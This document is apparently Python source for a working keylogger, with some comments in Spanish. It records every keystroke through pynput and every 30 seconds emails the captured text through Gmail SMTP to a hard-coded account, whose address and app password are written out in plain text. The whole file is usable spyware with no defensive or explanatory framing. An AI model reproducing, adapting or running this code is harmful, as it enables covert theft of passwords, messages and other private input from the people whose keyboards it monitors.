#!/usr/bin/env python3

import pynput.keyboard
import threading
import smtplib
import keyboard
from termcolor import colored
from email.mime.text import MIMEText



class Keylogger:

  def __init__(self):
    self.log=""
    self.list_log=[]
    self.request_shutdown= False
    self.timer=None
    self.is_first_run=True
    self.is_mayus=True


  def pressed_key(self,key):
    if keyboard.is_pressed('caps lock'):
      if not self.is_mayus:
        self.is_mayus=True
      elif self.is_mayus:
        self.is_mayus=False

    try:
      if self.is_mayus:
        self.list_log.append(key.char)
        self.log=''.join(self.list_log)
      else:
        self.list_log.append(key.char.upper())
        self.log=''.join(self.list_log)
    except AttributeError:
      special_keys= {key.space: " ",key.caps_lock: "" , key.enter: " Enter ", key.shift: " Shift ",key.ctrl:" Ctrl ", key.alt: " Alt "}
      if key != key.backspace:
        self.list_log.append(special_keys.get(key,f" {str(key)} "))
        self.log=''.join(self.list_log)
      elif key == key.backspace:
        try:
          self.list_log.pop()
          self.log=''.join(self.list_log)
        except:
          self.list_log.clear()
          self.log=''.join(self.list_log)



  def send_email(self,subject,body,sender,recipients,password):
    msg=MIMEText(body)
    msg['Subject'] = subject
    msg['From']= sender
    msg['To']= ', '.join(recipients)

    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
      smtp_server.login(sender,password)
      smtp_server.sendmail(sender,recipients,msg.as_string())


  def report(self):
    email_body= "[+] El keylogger se ha iniciado exitosamente" if self.is_first_run else self.log
    self.send_email("Keylogger Report", email_body, "nockeylogger@gmail.com", ["nockeylogger@gmail.com"], "ezro xvah ctgy qhlt")
    self.list_log.clear()
    self.log= ""

    if self.is_first_run:
      self.is_first_run=False

    if not self.request_shutdown:
      self.timer= threading.Timer(30, self.report)
      self.timer.start()

  def shutdown(self):
    self.request_shutdown=True
    if self.timer:
      self.timer.cancel()


  def start(self):
    keyboard_listener = pynput.keyboard.Listener(on_press=self.pressed_key) # Creamos el objeto keyboard_listener y mandamos cada pulsación a la función pressed_key

    with keyboard_listener: # Con un manejador de contextos with, si la conexión falla o se interrumpe se cierra automáticamente la escucha de pulsaciones
      self.report()
      keyboard_listener.join()
